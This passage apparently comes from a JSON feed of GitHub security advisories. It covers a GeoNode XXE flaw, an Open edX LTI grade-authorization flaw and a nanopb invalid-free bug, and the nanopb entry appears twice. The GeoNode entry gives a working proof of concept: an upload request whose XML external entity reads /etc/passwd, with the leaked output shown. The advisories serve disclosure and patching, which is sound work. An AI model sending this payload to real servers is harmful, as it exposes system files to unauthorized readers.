            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>GeoNode is vulnerable to an XML External Entity (XXE) injection in the style upload functionality of GeoServer leading to Arbitrary File Read.</p>\n<h3 id=\"details\">Details</h3>\n<p>GeoNode's GeoServer has the ability to upload new styles for datasets through the <a href=\"https://github.com/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/urls.py#L70-L72\"><code>dataset_style_upload</code> view</a>.</p>\n<pre><code class=\"language-py\"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/views.py#L158-L159\n@login_required\ndef dataset_style_upload(request, layername):\n    def respond(*args, **kw):\n        kw['content_type'] = 'text/html'\n        return json_response(*args, **kw)\n    ...\n    sld = request.FILES['sld'].read() # 1\n    sld_name = None\n    try:\n        # Check SLD is valid\n        ...\n        sld_name = extract_name_from_sld(gs_catalog, sld, sld_file=request.FILES['sld']) # 2\n    except Exception as e:\n        respond(errors=f\"The uploaded SLD file is not valid XML: {e}\")\n    name = data.get('name') or sld_name\n    set_dataset_style(layer, data.get('title') or name, sld)\n    return respond(\n        body={\n            'success': True,\n            'style': data.get('title') or name, # 3\n            'updated': data['update']})\n</code></pre>\n<p><code>dataset_style_upload</code> gets a user-provided file (<code>1</code>), pass it to <code>extract_name_from_sld</code> to extract an element from it (<code>2</code>) and return the former in the response (<code>3</code>).</p>\n<pre><code class=\"language-py\"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/helpers.py#L233-L234\ndef extract_name_from_sld(gs_catalog, sld, sld_file=None):\n    try:\n        if sld:\n            if isfile(sld):\n                with open(sld, \"rb\") as sld_file:\n                    sld = sld_file.read() # 1\n            if isinstance(sld, str):\n                sld = sld.encode('utf-8')\n            dom = etree.XML(sld) # 2\n        ...\n    named_dataset = dom.findall(\n        \"{http://www.opengis.net/sld}NamedLayer\")\n    el = None\n    if named_dataset and len(named_dataset) &gt; 0:\n        user_style = named_dataset[0].findall(\"{http://www.opengis.net/sld}UserStyle\")\n        if user_style and len(user_style) &gt; 0:\n            el = user_style[0].findall(\"{http://www.opengis.net/sld}Name\") # 3\n    ...\n    return el[0].text # 4\n</code></pre>\n<p><code>extract_name_from_sld</code> uses <code>sld</code> (which is a path to the provided file), reads it (<code>1</code>) and parses it with <a href=\"https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1312\"><code>etree.XML</code></a> in <code>2</code>. Since the former uses a <a href=\"https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1323-L1324\">default XMLParser</a>, the parsing gets done with the <a href=\"https://lxml.de/api/lxml.etree.XMLParser-class.html#:~:text=resolve_entities%3DTrue\"><code>resolve_entities</code> flag set to <code>True</code></a>. Therefore, <code>dom</code> handles the parsed XML containing the resolved entity (<code>2</code>), gets <code>NamedLayer.UserStyle.Name</code> in <code>3</code> and returns the resolved content in <code>4</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a guest/non-privileged account and log in.</li>\n<li>Upload a dataset through <code>/catalogue/#/upload/dataset</code> whose name we will be referencing as <code>&lt;DATASET_NAME&gt;</code>.</li>\n<li>Send the following request that will try to upload a new style for the dataset. The response will be returning the resolved entity with the contents of <code>/etc/passwd</code>:</li>\n</ol>\n<pre><code>POST /gs/geonode:&lt;DATASET_NAME&gt;/style/upload HTTP/1.1\nHost: localhost\nCookie: django_language=en-us; csrftoken=&lt;CSRF-TOKEN&gt;; sessionid=&lt;SESSION-COOKIE&gt;\nX-Csrftoken: &lt;CSRF-TOKEN&gt;\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryfoo\nContent-Length: 485\n------WebKitFormBoundaryfoo\nContent-Disposition: form-data; name=\"layerid\"\n1\n------WebKitFormBoundaryfoo\nContent-Disposition: form-data; name=\"sld\"; filename=\"foo.sld\"\nContent-Type: application/octet-stream\n&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY ent SYSTEM \"/etc/passwd\" &gt; ]&gt;\n&lt;foo xmlns=\"http://www.opengis.net/sld\"&gt;\n  &lt;NamedLayer&gt;\n    &lt;UserStyle&gt;\n        &lt;Name&gt;&amp;ent;&lt;/Name&gt;\n    &lt;/UserStyle&gt;\n  &lt;/NamedLayer&gt;\n&lt;/foo&gt;\n------WebKitFormBoundaryfoo--\n</code></pre>\n<p>Sample response:</p>\n<pre><code>HTTP/1.1 200 OK\nServer: nginx/1.23.2\n...\n{\"success\": true, \"style\": \"root:x:0:0:root:/root:/bin/bash...\", \"updated\": false}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated <code>Arbitrary File Read</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8\">https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-26043\">https://nvd.nist.gov/vuln/detail/CVE-2023-26043</a></li>\n<li><a href=\"https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0\">https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcmc-c59m-pqq8\">https://github.com/advisories/GHSA-mcmc-c59m-pqq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcmc-c59m-pqq8",
            "title": "[GeoNode] GeoServer style upload functionality vulnerable to XML External Entity (XXE) injection",
            "date_modified": "2024-08-30T18:50:02.000Z",
            "date_published": "2024-08-30T18:50:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcmc-c59m-pqq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"problem\">Problem</h3>\n<p>TL;DR: Any LTI tool that is integrated with on the Open edX platform can\npost a grade back for any LTI XBlock so long as it knows or can guess the\nblock location for that XBlock.</p>\n<p>In LTI 1.3, LTI tools can \"pass back\" scores that learners earn while using\nLTI tools to the edX platform. The edX platform then stores those LTI\nscores in a separate table. If the right conditions are met, these scores\nare then persisted to the LMS grades tables.</p>\n<p>LTI tools can create what are called \"line items\" on the edX platform. A\nline item can be thought of as a column in a grade book; it stores results\nfor a specific activity (i.e. XBlock) for a specific set of users (i.e.\nusers in the course using the XBlock). A line item has an optional\nresource_link_id field, which is basically the XBlock location. An LTI tool\ncan supply any value for this field.</p>\n<p>An LTI tool submits scores to the edX platform for line items. The code\nthat uploads that score to the LMS grade tables determines which XBlock to\nupload the grades for by reading the resource_link_id field of the\nassociated line item. Because the LTI tool could have submitted any value\nfor the resource_link_id field, this introduces the potential for a\nnefarious LTI tool to submit scores for any LTI XBlock on the platform.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any LTI tool that is integrated with on the Open edX platform can post a\ngrade back for any LTI XBlock so long as it knows the resource_link_id\n(i.e. block location) for that XBlock.</p>\n<p>The impact is a loss of integrity for LTI XBlock grades.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>No available patch</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87\">https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23611\">https://nvd.nist.gov/vuln/detail/CVE-2023-23611</a></li>\n<li><a href=\"https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7\">https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j9p-67mm-5g87\">https://github.com/advisories/GHSA-7j9p-67mm-5g87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j9p-67mm-5g87",
            "title": "[lti-consumer-xblock] LTI 1.3 Grade Pass Back Implementation has Missing Authorization Vulnerability",
            "date_modified": "2024-08-30T18:47:15.000Z",
            "date_published": "2024-08-30T18:47:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j9p-67mm-5g87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Preliminary patch is available on git for <a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">0.4.x</a> and <a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Following workarounds are available:</p>\n<ul>\n<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>\n<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>\n<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>Bug report: <a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-21401\">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1\">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88",
            "title": "[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC",
            "date_modified": "2024-08-30T18:45:42.000Z",
            "date_published": "2024-08-30T18:45:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Preliminary patch is available on git for <a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">0.4.x</a> and <a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Following workarounds are available:</p>\n<ul>\n<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>\n<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>\n<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>Bug report: <a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-21401\">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1\">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88",
            "title": "[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC",
            "date_modified": "2024-08-30T18:45:42.000Z",
            "date_published": "2024-08-30T18:45:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}